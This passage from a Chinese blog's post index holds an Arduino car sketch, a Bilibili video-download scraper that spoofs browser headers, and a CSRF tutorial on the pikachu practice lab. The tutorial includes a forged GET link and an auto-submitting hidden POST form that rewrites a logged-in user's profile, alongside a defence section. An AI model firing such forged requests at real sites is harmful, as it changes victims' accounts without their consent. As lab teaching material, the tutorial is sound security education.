setup code here, to run once:</span></span><br><span class="line">  <span class="comment">//设置控制电机的引脚为输出状态</span></span><br><span class="line">  <span class="built_in">pinMode</span>(leftMotor1, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(leftMotor2, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(rightMotor1, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(rightMotor2, <span class="literal">OUTPUT</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line">  <span class="keyword">int</span> cmd;</span><br><span class="line">  <span class="keyword">for</span>(cmd=<span class="number">0</span>;cmd&lt;<span class="number">5</span>;cmd++)<span class="comment">//依次执行向前、向后、向左、想有、停止四个运动状态</span></span><br><span class="line">  &#123;</span><br><span class="line">    motorRun(cmd);  </span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">2000</span>);<span class="comment">//每个命令执行2s </span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运动控制函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">motorRun</span><span class="params">(<span class="keyword">int</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">    <span class="keyword">case</span> FORWARD:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> BACKWARD:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> TURNLEFT:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> TURNRIGHT:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p>经过我粗浅的分析，小车的代码和连接应该没有问题，问过学长后认为可能是那个电机的问题（毕竟放了几年，放坏了？）</p><p>等过几天买的新套件到了再战，这次就这么告一段落了。车还没动起来，就翻车了，还是太菜了。</p></div>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF“苏醒的巨人”</title>
      <link href="posts/33839.html"/>
      <url>posts/33839.html</url>
      
        <content type="html"><![CDATA[<h1 id="小场面"><a href="#小场面" class="headerlink" title="小场面"></a>小场面</h1><ol><li>场景一：我点击了一个好友转发的qq空间消息，怎么莫名其妙自己也转发了？？？</li><li>场景二：我点击了一个不可描述的网页，然后自己的账号做了一些不可描述的操作？？？</li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lengjing.jpg"></p><h1 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h1><p>上面两个场面其实就是利用了 CSRF（Cross Site Request Forgery），即跨站请求伪造。攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。可以这么理解：攻击者盗用了你的身份，以你的名义进行某些不可描述的操作。</p><p>想象一下，它可以以你的名义发邮件、发消息、转账、修改密码、删除文章/留言/评论…….属实可恶！</p><p>CSRF 与 XSS 相比，虽然 CSRF 攻击不太流行，但却更加难以防范，所以被认为 CSRF 比 XSS 更具危险性，CSRF 在业内具有“苏醒的巨人”的称号。</p><h1 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/20171009075751481.png"></p><p>一般来说，用户完成以下两个操作，就有可能遭受CSRF攻击。</p><ol><li>登录信任网站A，并在本地生成Cookie。</li><li>在不登出A的情况下，访问危险网站B。</li></ol><h1 id="CSRF测试"><a href="#CSRF测试" class="headerlink" title="CSRF测试"></a>CSRF测试</h1><blockquote><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu漏洞练习平台</a>之CSRF</p></blockquote><h2 id="GET方式"><a href="#GET方式" class="headerlink" title="GET方式"></a>GET方式</h2><p>​    ① 用户甲登录信任网站，查看个人信息。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323205127914.png" alt="image-20210323205127914"></p><p>​    ② 攻击者构造恶意的链接，并将其发送给用户甲。</p><p>通过抓包可见，修改个人信息后提交的请求方法是GET。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323211923048.png" alt="image-20210323211923048"></p><p>URL里面的四个参数都可以被修改，直接构造URL为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.66&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;x&amp;phonenum&#x3D;000000&amp;add&#x3D;Mars&amp;email&#x3D;123@123.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure><p>​    ③ 攻击者通过社工等手段引诱用户甲点击这个链接。如果用户甲此时登录状态或cookie/session没有过期，则他的信息就被修改了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323212754122.png" alt="image-20210323212754122"></p><p>可以看到，个人信息内容按照恶意链接的设置被修改了，而用户甲仅点击了那个不明链接。</p><h2 id="POST方式"><a href="#POST方式" class="headerlink" title="POST方式"></a>POST方式</h2><p>​    ① 同样，用户乙登录了他信任的网站，一切正常。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323213429091.png" alt="image-20210323213429091"></p><p>​    ② 攻击者构造恶意的链接，并将其发送给用户乙。</p><p>抓包可见这次的请求方式是POST，URL不再显示修改参数，所以无法再使用上述办法（即通过URL来伪造请求）进行修改。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323213939444.png" alt="image-20210323213939444"></p><p>但可以自行创建一个恶意表单，让用户点击这个表单的URL，通过此表单向存在CSRF漏洞的页面去提交POST请求。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf_post<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;china&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    ③ 用户乙点击了这个恶意表单的链接后，其个人信息被修改。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323215151210.png" alt="image-20210323215151210"></p><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><p>​    ① 尽量使用POST</p><p>GET接口太容易被拿来做CSRF攻击，接口最好限制为POST使用，降低攻击风险。</p><p>当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p><p>​    ② 二次验证</p><p>在通常情况下，验证码能很好遏制CSRF攻击。当用户收到验证码提示后，可能会心存怀疑，就不会乖乖中招。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。</p><p>​    ③ Referer Check</p><p>Referer Check在Web最常见的应用就是“防止图片盗链”。同理，Referer Check也可以被用于检查请求是否来自合法的“源”（Referer值是否是指定页面，或者网站的域），如果都不是，那么就极可能是CSRF攻击。</p><p>但是因为服务器并不是什么时候都能取到Referer，所以也无法作为CSRF防御的主要手段。</p><p>​    ④ Token认证</p><p>Token 即标志，记号的意思，也叫作令牌。</p><p>例子：</p><ol><li>用户访问某个表单页面。</li><li>服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</li><li>在页面表单附带上Token参数。</li><li>用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</li></ol><p>这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。</p><blockquote><p>CSRF的Token仅仅适用于对抗CSRF攻击。当网站同时存在XSS漏洞时候，那这个方案也是空谈。因为攻击者可以通过js获取Token值。</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/weixin_44940180/article/details/107140456">Pikachu之CSRF</a></p><p>[2] <a href="https://blog.csdn.net/m0_37732829/article/details/90513122?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">Web安全之CSRF攻击</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫轻松搞定B站视频下载</title>
      <link href="posts/3575.html"/>
      <url>posts/3575.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在正常情况下（不使用其他工具或插件），Web端的bilibili似乎无法（彻底白嫖）下载视频，遂学习了如何利用Python爬虫下载b站视频（不包括会员视频），详情（手法）且看下文。</p><blockquote><p>参考视频：<a href="https://www.bilibili.com/video/BV1Fy4y1D7XS">https://www.bilibili.com/video/BV1Fy4y1D7XS</a></p><p>在分析b站网页源代码的过程中发现其视频和音频是分开的，下载后一个只有声音，一个只有画面，这显然不能满足我们的要求。解决方案是：利用 <a href="http://www.ffmpeg.org/download.html">ffmpeg</a> 这款强大的开源工具把下载后的音视频进行合并。故想要完美体验，先得下载安装并配置好 <code>ffmpeg</code> 。（到官网下载，解压后把文件夹内的<code>bin</code> 添加到环境变量）</p><p>Python中使用到的模块有：<code>requests</code>、<code>re</code>、<code>json</code>、<code>subprocess</code>、<code>os</code></p></blockquote><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>视频的<code>url</code>比较显眼，容易获取。<code>headers</code>也好找，但还需要一重要信息。</p><p>通过浏览器（F12）查看分析目标网页，找到我们的下一目标，即视（音）频下载链接。</p><p>一番查找后，发现在<code>head</code>里的第四个<code>script</code> 标签内似乎有我们想要的东西。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321234819818.png" alt="image-20210321234819818"></p><p>可访问此链接，却出现403，即没有权限访问此站。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321235102571.png" alt="image-20210321235102571"></p><p>这又怎么回事？查看Request Headers 信息，发现没有referer这一项，于是尝试在数据包中加上referer信息看能否访问。（这里直接上bp了）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321235900739.png" alt="image-20210321235900739"></p><p>Forward后，出现文件下载页面。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322000022154.png" alt="image-20210322000022154"></p><p>下载后打开改文件，确为目标视频。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322000250594.png" alt="image-20210322000250594"></p><h1 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h1><p>通过requests库向目标站点发起请求，请求需包含header、referer等信息，以伪装成是浏览器发出请求。如果服务器能正常响应，会得到一个Response，便是所要获取的页面内容。</p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers) <span class="comment">#发送get请求，获得响应</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">print(html_data)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322002017006.png" alt="image-20210322002017006"></p><h1 id="解析内容"><a href="#解析内容" class="headerlink" title="解析内容"></a>解析内容</h1><p>得到的内容可能是HTML、json等格式，可以用页面解析库、正则表达式等进行解析。</p><p><strong>title</strong>信息比较好找，就在head中。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322003021075.png" alt="image-20210322003021075"></p><p>利用正则表达式对其进行提取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>音视频下载链接</strong>在json数据中。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322003718230.png" alt="image-20210322003718230"></p><p>利用正则表达式和字典（列表）的“键”对其提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">json_data &#x3D; re.findall(r&#39;&lt;script&gt;window.__playinfo__&#x3D;(.*?)&lt;&#x2F;script&gt;&#39;,html_data)[0]</span><br><span class="line">    json_data &#x3D; json.loads(json_data) #解码 JSON 数据，返回 Python 字段的数据类型。</span><br><span class="line">    audio_url &#x3D; json_data[&quot;data&quot;][&quot;dash&quot;][&quot;audio&quot;][0][&quot;backupUrl&quot;][0]</span><br><span class="line">    video_url &#x3D; json_data[&quot;data&quot;][&quot;dash&quot;][&quot;video&quot;][0][&quot;backupUrl&quot;][0]</span><br></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    <span class="comment">#pprint.pprint(json_data)</span></span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> video_data:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322004738048.png" alt="image-20210322004738048"></p><h1 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h1><p>通过下载链接，将音视频下载到本地并保存。</p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的音频...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的音频！&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line">save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010005615.png" alt="image-20210322010005615"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010033745.png" alt="image-20210322010033745"></p><h1 id="合并音视频"><a href="#合并音视频" class="headerlink" title="合并音视频"></a>合并音视频</h1><p>把分开的音频和视频进行合并。（几次测试下来，发现如果用视频标题作为文件名去执行ffmpeg命令会导致其出现错误，暂时没找到解决方法，后来试着将文件名先重命名为1.mp3、1.mp4这种简单的名字，可以完成合并，再删除之)</p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 